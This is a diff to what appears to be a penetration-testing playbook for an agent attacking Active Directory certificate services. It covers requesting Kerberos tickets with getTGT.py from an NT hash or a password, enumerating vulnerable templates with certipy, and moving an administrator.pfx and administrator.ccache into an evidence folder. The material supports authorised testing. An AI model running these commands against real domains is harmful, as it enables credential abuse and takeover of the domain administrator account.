@@ -94,14 +94,24 @@ and records state changes. Your return summary must include:
 
 ```bash
 # Get TGT for Kerberos-based operations
-getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH
+cd $TMPDIR && getTGT.py DOMAIN/user -hashes :NTHASH -dc-ip DC_IP
 # or with password
-getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -password 'Password'
+cd $TMPDIR && getTGT.py DOMAIN/user:'Password' -dc-ip DC_IP
 
-export KRB5CCNAME=user.ccache
+export KRB5CCNAME=$TMPDIR/user.ccache
 
 # All Certipy commands use -k -no-pass after this
 certipy find -k -no-pass -dc-ip DC_IP -vulnerable
+```
+
+**Tool output directory**: `getTGT.py`, `certipy req`, and `certipy auth` all
+write output files to CWD with no output-path flag. Always prefix these commands
+with `cd $TMPDIR &&`. `getTGT.py` does NOT support `-out` — CWD is the only
+control. When saving evidence, use `mv` (not `cp`) to avoid stray duplicates:
+
+```bash
+mv $TMPDIR/administrator.pfx engagement/evidence/administrator.pfx
+mv $TMPDIR/administrator.ccache engagement/evidence/administrator.ccache
 ```
 
 ## Step 1: Enumerate Vulnerable Templates
